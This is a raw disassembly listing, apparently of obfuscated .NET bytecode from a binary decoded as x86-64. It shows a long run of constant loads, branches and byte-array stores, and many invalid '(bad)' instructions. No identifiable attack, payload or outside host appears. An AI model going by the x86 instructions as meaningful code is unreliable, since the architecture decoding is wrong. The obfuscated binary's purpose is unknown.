  405c86:	ff                   	(bad)
  405c87:	fe 0c 27             	decb   (%rdi,%riz,1)
  405c8a:	00 20                	add    %ah,(%rax)
  405c8c:	17                   	(bad)
  405c8d:	00 00                	add    %al,(%rax)
  405c8f:	00 20                	add    %ah,(%rax)
  405c91:	6a 00                	push   $0x0
  405c93:	00 00                	add    %al,(%rax)
  405c95:	20 5d 00             	and    %bl,0x0(%rbp)
  405c98:	00 00                	add    %al,(%rax)
  405c9a:	58                   	pop    %rax
  405c9b:	9c                   	pushf
  405c9c:	20 6b 00             	and    %ch,0x0(%rbx)
  405c9f:	00 00                	add    %al,(%rax)
  405ca1:	38 d6                	cmp    %dl,%dh
  405ca3:	d7                   	xlat   (%rbx)
  405ca4:	ff                   	(bad)
  405ca5:	ff                   	(bad)
  405ca6:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405ca9:	00 20                	add    %ah,(%rax)
  405cab:	0b 00                	or     (%rax),%eax
  405cad:	00 00                	add    %al,(%rax)
  405caf:	20 bf 00 00 00 20    	and    %bh,0x20000000(%rdi)
  405cb5:	3f                   	(bad)
  405cb6:	00 00                	add    %al,(%rax)
  405cb8:	00 59 9c             	add    %bl,-0x64(%rcx)
  405cbb:	20 74 00 00          	and    %dh,0x0(%rax,%rax,1)
  405cbf:	00 38                	add    %bh,(%rax)
  405cc1:	bf d7 ff ff fe       	mov    $0xfeffffd7,%edi
  405cc6:	0c 27                	or     $0x27,%al
  405cc8:	00 20                	add    %ah,(%rax)
  405cca:	17                   	(bad)
  405ccb:	00 00                	add    %al,(%rax)
  405ccd:	00 fe                	add    %bh,%dh
  405ccf:	0c 2b                	or     $0x2b,%al
  405cd1:	00 9c 20 e6 00 00 00 	add    %bl,0xe6(%rax,%riz,1)
  405cd8:	fe 0e                	decb   (%rsi)
  405cda:	33 00                	xor    (%rax),%eax
  405cdc:	38 9f d7 ff ff fe    	cmp    %bl,-0x1000029(%rdi)
  405ce2:	0c 27                	or     $0x27,%al
  405ce4:	00 20                	add    %ah,(%rax)
  405ce6:	07                   	(bad)
  405ce7:	00 00                	add    %al,(%rax)
  405ce9:	00 fe                	add    %bh,%dh
  405ceb:	0c 0c                	or     $0xc,%al
  405ced:	00 9c 20 32 01 00 00 	add    %bl,0x132(%rax,%riz,1)
  405cf4:	fe 0e                	decb   (%rsi)
  405cf6:	33 00                	xor    (%rax),%eax
  405cf8:	16                   	(bad)
  405cf9:	39 82 d7 ff ff 11    	cmp    %eax,0x11ffffd7(%rdx)
  405cff:	25 19 11 19 17       	and    $0x17191119,%eax
  405d04:	91                   	xchg   %eax,%ecx
  405d05:	9c                   	pushf
  405d06:	20 81 01 00 00 38    	and    %al,0x38000001(%rcx)
  405d0c:	6c                   	insb   (%dx),(%rdi)
  405d0d:	d7                   	xlat   (%rbx)
  405d0e:	ff                   	(bad)
  405d0f:	ff 20                	jmp    *(%rax)
  405d11:	e8 00 00 00 20       	call   0x20405d16
  405d16:	4d 00 00             	rex.WRB add %r8b,(%r8)
  405d19:	00 59 fe             	add    %bl,-0x2(%rcx)
  405d1c:	0e                   	(bad)
  405d1d:	0b 00                	or     (%rax),%eax
  405d1f:	20 05 01 00 00 fe    	and    %al,-0x1ffffff(%rip)        # 0xfffffffffe405d26
  405d25:	0e                   	(bad)
  405d26:	33 00                	xor    (%rax),%eax
  405d28:	38 3a                	cmp    %bh,(%rdx)
  405d2a:	0e                   	(bad)
  405d2b:	00 00                	add    %al,(%rax)
  405d2d:	3a 4e d7             	cmp    -0x29(%rsi),%cl
  405d30:	ff                   	(bad)
  405d31:	ff 11                	call   *(%rcx)
  405d33:	08 80 08 00 00 04    	or     %al,0x4000008(%rax)
  405d39:	20 89 00 00 00 38    	and    %cl,0x38000000(%rcx)
  405d3f:	39 d7                	cmp    %edx,%edi
  405d41:	ff                   	(bad)
  405d42:	ff                   	(bad)
  405d43:	38 16                	cmp    %dl,(%rsi)
  405d45:	e5 ff                	in     $0xff,%eax
  405d47:	ff 11                	call   *(%rcx)
  405d49:	18 11                	sbb    %dl,(%rcx)
  405d4b:	10 11                	adc    %dl,(%rcx)
  405d4d:	18 11                	sbb    %dl,(%rcx)
  405d4f:	10 91 11 25 11 10    	adc    %dl,0x10112511(%rcx)
  405d55:	91                   	xchg   %eax,%ecx
  405d56:	61                   	(bad)
  405d57:	d2 9c 20 e5 00 00 00 	rcrb   %cl,0xe5(%rax,%riz,1)
  405d5e:	fe 0e                	decb   (%rsi)
  405d60:	33 00                	xor    (%rax),%eax
  405d62:	38 19                	cmp    %bl,(%rcx)
  405d64:	d7                   	xlat   (%rbx)
  405d65:	ff                   	(bad)
  405d66:	ff                   	(bad)
  405d67:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405d6a:	00 20                	add    %ah,(%rax)
  405d6c:	0b 00                	or     (%rax),%eax
  405d6e:	00 00                	add    %al,(%rax)
  405d70:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  405d73:	00 9c 20 8f 01 00 00 	add    %bl,0x18f(%rax,%riz,1)
  405d7a:	38 fd                	cmp    %bh,%ch
  405d7c:	d6                   	udb
  405d7d:	ff                   	(bad)
  405d7e:	ff 20                	jmp    *(%rax)
  405d80:	e6 00                	out    %al,$0x0
  405d82:	00 00                	add    %al,(%rax)
  405d84:	20 4c 00 00          	and    %cl,0x0(%rax,%rax,1)
  405d88:	00 59 fe             	add    %bl,-0x2(%rcx)
  405d8b:	0e                   	(bad)
  405d8c:	0c 00                	or     $0x0,%al
  405d8e:	20 44 00 00          	and    %al,0x0(%rax,%rax,1)
  405d92:	00 38                	add    %bh,(%rax)
  405d94:	ec                   	in     (%dx),%al
  405d95:	d6                   	udb
  405d96:	ff                   	(bad)
  405d97:	ff                   	(bad)
  405d98:	fe 0c 27             	decb   (%rdi,%riz,1)
  405d9b:	00 20                	add    %ah,(%rax)
  405d9d:	09 00                	or     %eax,(%rax)
  405d9f:	00 00                	add    %al,(%rax)
  405da1:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405da4:	00 9c 20 82 01 00 00 	add    %bl,0x182(%rax,%riz,1)
  405dab:	38 cc                	cmp    %cl,%ah
  405dad:	d6                   	udb
  405dae:	ff                   	(bad)
  405daf:	ff                   	(bad)
  405db0:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405db3:	00 20                	add    %ah,(%rax)
  405db5:	06                   	(bad)
  405db6:	00 00                	add    %al,(%rax)
  405db8:	00 20                	add    %ah,(%rax)
  405dba:	9a                   	(bad)
  405dbb:	00 00                	add    %al,(%rax)
  405dbd:	00 20                	add    %ah,(%rax)
  405dbf:	30 00                	xor    %al,(%rax)
  405dc1:	00 00                	add    %al,(%rax)
  405dc3:	59                   	pop    %rcx
  405dc4:	9c                   	pushf
  405dc5:	20 2a                	and    %ch,(%rdx)
  405dc7:	01 00                	add    %eax,(%rax)
  405dc9:	00 38                	add    %bh,(%rax)
  405dcb:	ad                   	lods   (%rsi),%eax
  405dcc:	d6                   	udb
  405dcd:	ff                   	(bad)
  405dce:	ff 11                	call   *(%rcx)
  405dd0:	19 8e 69 16 3e fa    	sbb    %ecx,-0x5c1e997(%rsi)
  405dd6:	fa                   	cli
  405dd7:	ff                   	(bad)
  405dd8:	ff 20                	jmp    *(%rax)
  405dda:	91                   	xchg   %eax,%ecx
  405ddb:	01 00                	add    %eax,(%rax)
  405ddd:	00 38                	add    %bh,(%rax)
  405ddf:	a1 d6 ff ff 20 01 00 	movabs 0x120ffffd6,%eax
  405de6:	00 00 
  405de8:	20 41 00             	and    %al,0x0(%rcx)
  405deb:	00 00                	add    %al,(%rax)
  405ded:	58                   	pop    %rax
  405dee:	fe 0e                	decb   (%rsi)
  405df0:	1e                   	(bad)
  405df1:	00 20                	add    %ah,(%rax)
  405df3:	63 00                	movsxd (%rax),%eax
  405df5:	00 00                	add    %al,(%rax)
  405df7:	38 88 d6 ff ff 16    	cmp    %cl,0x16ffffd6(%rax)
  405dfd:	13 0e                	adc    (%rsi),%ecx
  405dff:	20 a7 00 00 00 38    	and    %ah,0x38000000(%rdi)
  405e05:	73 d6                	jae    0x405ddd
  405e07:	ff                   	(bad)
  405e08:	ff 20                	jmp    *(%rax)
  405e0a:	cf                   	iret
  405e0b:	00 00                	add    %al,(%rax)
  405e0d:	00 20                	add    %ah,(%rax)
  405e0f:	45 00 00             	add    %r8b,(%r8)
  405e12:	00 59 fe             	add    %bl,-0x2(%rcx)
  405e15:	0e                   	(bad)
  405e16:	0b 00                	or     (%rax),%eax
  405e18:	38 54 0d 00          	cmp    %dl,0x0(%rbp,%rcx,1)
  405e1c:	00 38                	add    %bh,(%rax)
  405e1e:	59                   	pop    %rcx
  405e1f:	0d 00 00 3a 99       	or     $0x993a0000,%eax
  405e24:	fd                   	std
  405e25:	ff                   	(bad)
  405e26:	ff 26                	jmp    *(%rsi)
  405e28:	20 1b                	and    %bl,(%rbx)
  405e2a:	00 00                	add    %al,(%rax)
  405e2c:	00 38                	add    %bh,(%rax)
  405e2e:	4a d6                	rex.WX udb
  405e30:	ff                   	(bad)
  405e31:	ff 20                	jmp    *(%rax)
  405e33:	0e                   	(bad)
  405e34:	00 00                	add    %al,(%rax)
  405e36:	00 20                	add    %ah,(%rax)
  405e38:	7b 00                	jnp    0x405e3a
  405e3a:	00 00                	add    %al,(%rax)
  405e3c:	58                   	pop    %rax
  405e3d:	fe 0e                	decb   (%rsi)
  405e3f:	1e                   	(bad)
  405e40:	00 20                	add    %ah,(%rax)
  405e42:	5e                   	pop    %rsi
  405e43:	00 00                	add    %al,(%rax)
  405e45:	00 fe                	add    %bh,%dh
  405e47:	0e                   	(bad)
  405e48:	33 00                	xor    (%rax),%eax
  405e4a:	38 36                	cmp    %dh,(%rsi)
  405e4c:	0d 00 00 39 8d       	or     $0x8d390000,%eax
  405e51:	ea                   	(bad)
  405e52:	ff                   	(bad)
  405e53:	ff                   	(bad)
  405e54:	38 27                	cmp    %ah,(%rdi)
  405e56:	d6                   	udb
  405e57:	ff                   	(bad)
  405e58:	ff 20                	jmp    *(%rax)
  405e5a:	98                   	cwtl
  405e5b:	00 00                	add    %al,(%rax)
  405e5d:	00 20                	add    %ah,(%rax)
  405e5f:	2a 00                	sub    (%rax),%al
  405e61:	00 00                	add    %al,(%rax)
  405e63:	58                   	pop    %rax
  405e64:	fe 0e                	decb   (%rsi)
  405e66:	2b 00                	sub    (%rax),%eax
  405e68:	20 87 00 00 00 38    	and    %al,0x38000000(%rdi)
  405e6e:	0a d6                	or     %dh,%dl
  405e70:	ff                   	(bad)
  405e71:	ff 11                	call   *(%rcx)
  405e73:	21 11                	and    %edx,(%rcx)
  405e75:	18 11                	sbb    %dl,(%rcx)
  405e77:	25 38 12 0d 00       	and    $0xd1238,%eax
  405e7c:	00 13                	add    %dl,(%rbx)
  405e7e:	06                   	(bad)
  405e7f:	20 3c 01             	and    %bh,(%rcx,%rax,1)
  405e82:	00 00                	add    %al,(%rax)
  405e84:	38 fb                	cmp    %bh,%bl
  405e86:	d5 ff ff fe          	{rex2 0xff} ud0 %r30,%r31
  405e8a:	0c 27                	or     $0x27,%al
  405e8c:	00 20                	add    %ah,(%rax)
  405e8e:	0a 00                	or     (%rax),%al
  405e90:	00 00                	add    %al,(%rax)
  405e92:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405e95:	00 9c 20 3b 00 00 00 	add    %bl,0x3b(%rax,%riz,1)
  405e9c:	fe 0e                	decb   (%rsi)
  405e9e:	33 00                	xor    (%rax),%eax
  405ea0:	38 db                	cmp    %bl,%bl
  405ea2:	d5 ff ff fe          	{rex2 0xff} ud0 %r30,%r31
  405ea6:	0c 27                	or     $0x27,%al
  405ea8:	00 20                	add    %ah,(%rax)
  405eaa:	00 00                	add    %al,(%rax)
  405eac:	00 00                	add    %al,(%rax)
  405eae:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405eb1:	00 9c 20 10 00 00 00 	add    %bl,0x10(%rax,%riz,1)
  405eb8:	fe 0e                	decb   (%rsi)
  405eba:	33 00                	xor    (%rax),%eax
  405ebc:	38 bf d5 ff ff fe    	cmp    %bh,-0x100002b(%rdi)
  405ec2:	0c 2f                	or     $0x2f,%al
  405ec4:	00 20                	add    %ah,(%rax)
  405ec6:	08 00                	or     %al,(%rax)
  405ec8:	00 00                	add    %al,(%rax)
  405eca:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  405ecd:	00 9c 20 71 00 00 00 	add    %bl,0x71(%rax,%riz,1)
  405ed4:	fe 0e                	decb   (%rsi)
  405ed6:	33 00                	xor    (%rax),%eax
  405ed8:	38 bc 0c 00 00 39 9e 	cmp    %bh,-0x61c70000(%rsp,%rcx,1)
  405edf:	d5 ff ff fe          	{rex2 0xff} ud0 %r30,%r31
  405ee3:	0c 27                	or     $0x27,%al
  405ee5:	00 20                	add    %ah,(%rax)
  405ee7:	0e                   	(bad)
  405ee8:	00 00                	add    %al,(%rax)
  405eea:	00 fe                	add    %bh,%dh
  405eec:	0c 2b                	or     $0x2b,%al
  405eee:	00 9c 20 5a 01 00 00 	add    %bl,0x15a(%rax,%riz,1)
  405ef5:	fe 0e                	decb   (%rsi)
  405ef7:	33 00                	xor    (%rax),%eax
  405ef9:	17                   	(bad)
  405efa:	3a 81 d5 ff ff fe    	cmp    -0x100002b(%rcx),%al
  405f00:	0c 27                	or     $0x27,%al
  405f02:	00 20                	add    %ah,(%rax)
  405f04:	1b 00                	sbb    (%rax),%eax
  405f06:	00 00                	add    %al,(%rax)
  405f08:	20 3a                	and    %bh,(%rdx)
  405f0a:	00 00                	add    %al,(%rax)
  405f0c:	00 20                	add    %ah,(%rax)
  405f0e:	40 00 00             	rex add %al,(%rax)
  405f11:	00 58 9c             	add    %bl,-0x64(%rax)
  405f14:	20 55 00             	and    %dl,0x0(%rbp)
  405f17:	00 00                	add    %al,(%rax)
  405f19:	fe 0e                	decb   (%rsi)
  405f1b:	33 00                	xor    (%rax),%eax
  405f1d:	17                   	(bad)
  405f1e:	3a 5d d5             	cmp    -0x2b(%rbp),%bl
  405f21:	ff                   	(bad)
  405f22:	ff 20                	jmp    *(%rax)
  405f24:	ec                   	in     (%dx),%al
  405f25:	00 00                	add    %al,(%rax)
  405f27:	00 20                	add    %ah,(%rax)
  405f29:	4e 00 00             	rex.WRX add %r8b,(%rax)
  405f2c:	00 59 fe             	add    %bl,-0x2(%rcx)
  405f2f:	0e                   	(bad)
  405f30:	0b 00                	or     (%rax),%eax
  405f32:	20 a2 01 00 00 fe    	and    %ah,-0x1ffffff(%rdx)
  405f38:	0e                   	(bad)
  405f39:	33 00                	xor    (%rax),%eax
  405f3b:	38 40 d5             	cmp    %al,-0x2b(%rax)
  405f3e:	ff                   	(bad)
  405f3f:	ff 20                	jmp    *(%rax)
  405f41:	c6 00 00             	movb   $0x0,(%rax)
  405f44:	00 20                	add    %ah,(%rax)
  405f46:	42 00 00             	rex.X add %al,(%rax)
  405f49:	00 59 fe             	add    %bl,-0x2(%rcx)
  405f4c:	0e                   	(bad)
  405f4d:	2b 00                	sub    (%rax),%eax
  405f4f:	20 41 00             	and    %al,0x0(%rcx)
  405f52:	00 00                	add    %al,(%rax)
  405f54:	fe 0e                	decb   (%rsi)
  405f56:	33 00                	xor    (%rax),%eax
  405f58:	38 46 0c             	cmp    %al,0xc(%rsi)
  405f5b:	00 00                	add    %al,(%rax)
  405f5d:	3a 1e                	cmp    (%rsi),%bl
  405f5f:	d5 ff ff fe          	{rex2 0xff} ud0 %r30,%r31
  405f63:	0c 27                	or     $0x27,%al
  405f65:	00 20                	add    %ah,(%rax)
  405f67:	19 00                	sbb    %eax,(%rax)
  405f69:	00 00                	add    %al,(%rax)
  405f6b:	20 5b 00             	and    %bl,0x0(%rbx)
  405f6e:	00 00                	add    %al,(%rax)
  405f70:	20 6f 00             	and    %ch,0x0(%rdi)
  405f73:	00 00                	add    %al,(%rax)
  405f75:	58                   	pop    %rax
  405f76:	9c                   	pushf
  405f77:	20 97 01 00 00 38    	and    %dl,0x38000001(%rdi)
  405f7d:	03 d5                	add    %ebp,%edx
  405f7f:	ff                   	(bad)
  405f80:	ff                   	(bad)
  405f81:	fe 0c 27             	decb   (%rdi,%riz,1)
  405f84:	00 20                	add    %ah,(%rax)
  405f86:	17                   	(bad)
  405f87:	00 00                	add    %al,(%rax)
  405f89:	00 fe                	add    %bh,%dh
  405f8b:	0c 2b                	or     $0x2b,%al
  405f8d:	00 9c 20 05 00 00 00 	add    %bl,0x5(%rax,%riz,1)
  405f94:	38 eb                	cmp    %ch,%bl
  405f96:	d4                   	(bad)
  405f97:	ff                   	(bad)
  405f98:	ff 20                	jmp    *(%rax)
  405f9a:	3b 00                	cmp    (%rax),%eax
  405f9c:	00 00                	add    %al,(%rax)
  405f9e:	20 65 00             	and    %ah,0x0(%rbp)
  405fa1:	00 00                	add    %al,(%rax)
  405fa3:	58                   	pop    %rax
  405fa4:	fe 0e                	decb   (%rsi)
  405fa6:	2b 00                	sub    (%rax),%eax
  405fa8:	20 36                	and    %dh,(%rsi)
  405faa:	00 00                	add    %al,(%rax)
  405fac:	00 fe                	add    %bh,%dh
  405fae:	0e                   	(bad)
  405faf:	33 00                	xor    (%rax),%eax
  405fb1:	38 f7                	cmp    %dh,%bh
  405fb3:	0b 00                	or     (%rax),%eax
  405fb5:	00 39                	add    %bh,(%rcx)
  405fb7:	27                   	(bad)
  405fb8:	ff                   	(bad)
  405fb9:	ff                   	(bad)
  405fba:	ff                   	(bad)
  405fbb:	38 c0                	cmp    %al,%al
  405fbd:	d4                   	(bad)
  405fbe:	ff                   	(bad)
  405fbf:	ff 20                	jmp    *(%rax)
  405fc1:	5a                   	pop    %rdx
  405fc2:	00 00                	add    %al,(%rax)
  405fc4:	00 20                	add    %ah,(%rax)
  405fc6:	73 00                	jae    0x405fc8
  405fc8:	00 00                	add    %al,(%rax)
  405fca:	58                   	pop    %rax
  405fcb:	fe 0e                	decb   (%rsi)
  405fcd:	0c 00                	or     $0x0,%al
  405fcf:	20 a1 01 00 00 fe    	and    %ah,-0x1ffffff(%rcx)
  405fd5:	0e                   	(bad)
  405fd6:	33 00                	xor    (%rax),%eax
  405fd8:	16                   	(bad)
  405fd9:	39 a2 d4 ff ff 11    	cmp    %esp,0x11ffffd4(%rdx)
  405fdf:	1d 16 3e d0 e1       	sbb    $0xe1d03e16,%eax
  405fe4:	ff                   	(bad)
  405fe5:	ff 20                	jmp    *(%rax)
  405fe7:	15 01 00 00 38       	adc    $0x38000001,%eax
  405fec:	8c d4                	mov    %ss,%esp
  405fee:	ff                   	(bad)
  405fef:	ff                   	(bad)
  405ff0:	fe 0c 27             	decb   (%rdi,%riz,1)
  405ff3:	00 20                	add    %ah,(%rax)
  405ff5:	1d 00 00 00 fe       	sbb    $0xfe000000,%eax
  405ffa:	0c 2b                	or     $0x2b,%al
  405ffc:	00 9c 20 f3 00 00 00 	add    %bl,0xf3(%rax,%riz,1)
  406003:	fe 0e                	decb   (%rsi)
  406005:	33 00                	xor    (%rax),%eax
  406007:	38 74 d4 ff          	cmp    %dh,-0x1(%rsp,%rdx,8)
  40600b:	ff                   	(bad)
  40600c:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40600f:	00 20                	add    %ah,(%rax)
  406011:	0b 00                	or     (%rax),%eax
  406013:	00 00                	add    %al,(%rax)
  406015:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  406018:	00 9c 20 b0 00 00 00 	add    %bl,0xb0(%rax,%riz,1)
  40601f:	fe 0e                	decb   (%rsi)
  406021:	33 00                	xor    (%rax),%eax
  406023:	38 8f 0b 00 00 39    	cmp    %cl,0x3900000b(%rdi)
  406029:	c2 ea ff             	ret    $0xffea
  40602c:	ff                   	(bad)
  40602d:	38 4e d4             	cmp    %cl,-0x2c(%rsi)
  406030:	ff                   	(bad)
  406031:	ff                   	(bad)
  406032:	fe 0c 27             	decb   (%rdi,%riz,1)
  406035:	00 20                	add    %ah,(%rax)
  406037:	01 00                	add    %eax,(%rax)
  406039:	00 00                	add    %al,(%rax)
  40603b:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  40603e:	00 9c 20 00 01 00 00 	add    %bl,0x100(%rax,%riz,1)
  406045:	fe 0e                	decb   (%rsi)
  406047:	33 00                	xor    (%rax),%eax
  406049:	17                   	(bad)
  40604a:	3a 31                	cmp    (%rcx),%dh
  40604c:	d4                   	(bad)
  40604d:	ff                   	(bad)
  40604e:	ff 20                	jmp    *(%rax)
  406050:	7d 00                	jge    0x406052
  406052:	00 00                	add    %al,(%rax)
  406054:	20 46 00             	and    %al,0x0(%rsi)
  406057:	00 00                	add    %al,(%rax)
  406059:	59                   	pop    %rcx
  40605a:	fe 0e                	decb   (%rsi)
  40605c:	2b 00                	sub    (%rax),%eax
  40605e:	20 cb                	and    %cl,%bl
  406060:	00 00                	add    %al,(%rax)
  406062:	00 fe                	add    %bh,%dh
  406064:	0e                   	(bad)
  406065:	33 00                	xor    (%rax),%eax
  406067:	38 14 d4             	cmp    %dl,(%rsp,%rdx,8)
  40606a:	ff                   	(bad)
  40606b:	ff                   	(bad)
  40606c:	fe 0c 27             	decb   (%rdi,%riz,1)
  40606f:	00 20                	add    %ah,(%rax)
  406071:	15 00 00 00 fe       	adc    $0xfe000000,%eax
  406076:	0c 0c                	or     $0xc,%al
  406078:	00 9c 20 23 00 00 00 	add    %bl,0x23(%rax,%riz,1)
  40607f:	38 f8                	cmp    %bh,%al
  406081:	d3 ff                	sar    %cl,%edi
  406083:	ff 20                	jmp    *(%rax)
  406085:	ef                   	out    %eax,(%dx)
  406086:	00 00                	add    %al,(%rax)
  406088:	00 20                	add    %ah,(%rax)
  40608a:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  40608d:	00 59 fe             	add    %bl,-0x2(%rcx)
  406090:	0e                   	(bad)
  406091:	2b 00                	sub    (%rax),%eax
  406093:	20 52 01             	and    %dl,0x1(%rdx)
  406096:	00 00                	add    %al,(%rax)
  406098:	38 df                	cmp    %bl,%bh
  40609a:	d3 ff                	sar    %cl,%edi
  40609c:	ff                   	(bad)
  40609d:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4060a0:	00 20                	add    %ah,(%rax)
  4060a2:	0d 00 00 00 20       	or     $0x20000000,%eax
  4060a7:	88 00                	mov    %al,(%rax)
  4060a9:	00 00                	add    %al,(%rax)
  4060ab:	20 2d 00 00 00 59    	and    %ch,0x59000000(%rip)        # 0x594060b1
  4060b1:	9c                   	pushf
  4060b2:	20 5c 00 00          	and    %bl,0x0(%rax,%rax,1)
  4060b6:	00 fe                	add    %bh,%dh
  4060b8:	0e                   	(bad)
  4060b9:	33 00                	xor    (%rax),%eax
  4060bb:	38 01                	cmp    %al,(%rcx)
  4060bd:	0b 00                	or     (%rax),%eax
  4060bf:	00 39                	add    %bh,(%rcx)
  4060c1:	47 ec                	rex.RXB in (%dx),%al
  4060c3:	ff                   	(bad)
  4060c4:	ff                   	(bad)
  4060c5:	38 b6 d3 ff ff 20    	cmp    %dh,0x20ffffd3(%rsi)
  4060cb:	1e                   	(bad)
  4060cc:	00 00                	add    %al,(%rax)
  4060ce:	00 20                	add    %ah,(%rax)
  4060d0:	57                   	push   %rdi
  4060d1:	00 00                	add    %al,(%rax)
  4060d3:	00 58 fe             	add    %bl,-0x2(%rax)
  4060d6:	0e                   	(bad)
  4060d7:	2b 00                	sub    (%rax),%eax
  4060d9:	20 ad 01 00 00 fe    	and    %ch,-0x1ffffff(%rbp)
  4060df:	0e                   	(bad)
  4060e0:	33 00                	xor    (%rax),%eax
  4060e2:	38 99 d3 ff ff fe    	cmp    %bl,-0x100002d(%rcx)
  4060e8:	0c 27                	or     $0x27,%al
  4060ea:	00 20                	add    %ah,(%rax)
  4060ec:	01 00                	add    %eax,(%rax)
  4060ee:	00 00                	add    %al,(%rax)
  4060f0:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4060f3:	00 9c 20 43 00 00 00 	add    %bl,0x43(%rax,%riz,1)
  4060fa:	38 7d d3             	cmp    %bh,-0x2d(%rbp)
  4060fd:	ff                   	(bad)
  4060fe:	ff 20                	jmp    *(%rax)
  406100:	80 00 00             	addb   $0x0,(%rax)
  406103:	00 20                	add    %ah,(%rax)
  406105:	2a 00                	sub    (%rax),%al
  406107:	00 00                	add    %al,(%rax)
  406109:	59                   	pop    %rcx
  40610a:	fe 0e                	decb   (%rsi)
  40610c:	0c 00                	or     $0x0,%al
  40610e:	20 18                	and    %bl,(%rax)
  406110:	01 00                	add    %eax,(%rax)
  406112:	00 fe                	add    %bh,%dh
  406114:	0e                   	(bad)
  406115:	33 00                	xor    (%rax),%eax
  406117:	16                   	(bad)
  406118:	39 63 d3             	cmp    %esp,-0x2d(%rbx)
  40611b:	ff                   	(bad)
  40611c:	ff 20                	jmp    *(%rax)
  40611e:	9e                   	sahf
  40611f:	00 00                	add    %al,(%rax)
  406121:	00 20                	add    %ah,(%rax)
  406123:	52                   	push   %rdx
  406124:	00 00                	add    %al,(%rax)
  406126:	00 59 fe             	add    %bl,-0x2(%rcx)
  406129:	0e                   	(bad)
  40612a:	2b 00                	sub    (%rax),%eax
  40612c:	20 d9                	and    %bl,%cl
  40612e:	00 00                	add    %al,(%rax)
  406130:	00 38                	add    %bh,(%rax)
  406132:	4e d3 ff             	rex.WRX sar %cl,%rdi
  406135:	ff 11                	call   *(%rcx)
  406137:	1d 16 3e a3 e7       	sbb    $0xe7a33e16,%eax
  40613c:	ff                   	(bad)
  40613d:	ff 20                	jmp    *(%rax)
  40613f:	25 00 00 00 38       	and    $0x38000000,%eax
  406144:	34 d3                	xor    $0xd3,%al
  406146:	ff                   	(bad)
  406147:	ff                   	(bad)
  406148:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40614b:	00 20                	add    %ah,(%rax)
  40614d:	0d 00 00 00 20       	or     $0x20000000,%eax
  406152:	cf                   	iret
  406153:	00 00                	add    %al,(%rax)
  406155:	00 20                	add    %ah,(%rax)
  406157:	45 00 00             	add    %r8b,(%r8)
  40615a:	00 59 9c             	add    %bl,-0x64(%rcx)
  40615d:	20 37                	and    %dh,(%rdi)
  40615f:	00 00                	add    %al,(%rax)
  406161:	00 38                	add    %bh,(%rax)
  406163:	1d d3 ff ff fe       	sbb    $0xfeffffd3,%eax
  406168:	0c 27                	or     $0x27,%al
  40616a:	00 20                	add    %ah,(%rax)
  40616c:	01 00                	add    %eax,(%rax)
  40616e:	00 00                	add    %al,(%rax)
  406170:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  406173:	00 9c 20 33 00 00 00 	add    %bl,0x33(%rax,%riz,1)
  40617a:	38 fd                	cmp    %bh,%ch
  40617c:	d2 ff                	sar    %cl,%bh
  40617e:	ff 11                	call   *(%rcx)
  406180:	25 1d 11 19 19       	and    $0x1919111d,%eax
  406185:	91                   	xchg   %eax,%ecx
  406186:	9c                   	pushf
  406187:	20 dc                	and    %bl,%ah
  406189:	00 00                	add    %al,(%rax)
  40618b:	00 fe                	add    %bh,%dh
  40618d:	0e                   	(bad)
  40618e:	33 00                	xor    (%rax),%eax
  406190:	17                   	(bad)
  406191:	3a ea                	cmp    %dl,%ch
  406193:	d2 ff                	sar    %cl,%bh
  406195:	ff                   	(bad)
  406196:	fe 0c 27             	decb   (%rdi,%riz,1)
  406199:	00 20                	add    %ah,(%rax)
  40619b:	16                   	(bad)
  40619c:	00 00                	add    %al,(%rax)
  40619e:	00 fe                	add    %bh,%dh
  4061a0:	0c 0c                	or     $0xc,%al
  4061a2:	00 9c 20 6a 00 00 00 	add    %bl,0x6a(%rax,%riz,1)
  4061a9:	fe 0e                	decb   (%rsi)
  4061ab:	33 00                	xor    (%rax),%eax
  4061ad:	16                   	(bad)
  4061ae:	39 cd                	cmp    %ecx,%ebp
  4061b0:	d2 ff                	sar    %cl,%bh
  4061b2:	ff 11                	call   *(%rcx)
  4061b4:	1a 13                	sbb    (%rbx),%dl
  4061b6:	0a 20                	or     (%rax),%ah
  4061b8:	60                   	(bad)
  4061b9:	00 00                	add    %al,(%rax)
  4061bb:	00 38                	add    %bh,(%rax)
  4061bd:	bb d2 ff ff fe       	mov    $0xfeffffd2,%ebx
  4061c2:	0c 27                	or     $0x27,%al
  4061c4:	00 20                	add    %ah,(%rax)
  4061c6:	14 00                	adc    $0x0,%al
  4061c8:	00 00                	add    %al,(%rax)
  4061ca:	20 a4 00 00 00 20 36 	and    %ah,0x36200000(%rax,%rax,1)
  4061d1:	00 00                	add    %al,(%rax)
  4061d3:	00 59 9c             	add    %bl,-0x64(%rcx)
  4061d6:	20 3e                	and    %bh,(%rsi)
  4061d8:	01 00                	add    %eax,(%rax)
  4061da:	00 38                	add    %bh,(%rax)
  4061dc:	9c                   	pushf
  4061dd:	d2 ff                	sar    %cl,%bh
  4061df:	ff 20                	jmp    *(%rax)
  4061e1:	f9                   	stc
  4061e2:	00 00                	add    %al,(%rax)
  4061e4:	00 20                	add    %ah,(%rax)
  4061e6:	53                   	push   %rbx
  4061e7:	00 00                	add    %al,(%rax)
  4061e9:	00 59 fe             	add    %bl,-0x2(%rcx)
  4061ec:	0e                   	(bad)
  4061ed:	0c 00                	or     $0x0,%al
  4061ef:	20 22                	and    %ah,(%rdx)
  4061f1:	00 00                	add    %al,(%rax)
  4061f3:	00 38                	add    %bh,(%rax)
  4061f5:	83 d2 ff             	adc    $0xffffffff,%edx
  4061f8:	ff 20                	jmp    *(%rax)
  4061fa:	72 00                	jb     0x4061fc
  4061fc:	00 00                	add    %al,(%rax)
  4061fe:	20 22                	and    %ah,(%rdx)
  406200:	00 00                	add    %al,(%rax)
  406202:	00 58 fe             	add    %bl,-0x2(%rax)
  406205:	0e                   	(bad)
  406206:	1e                   	(bad)
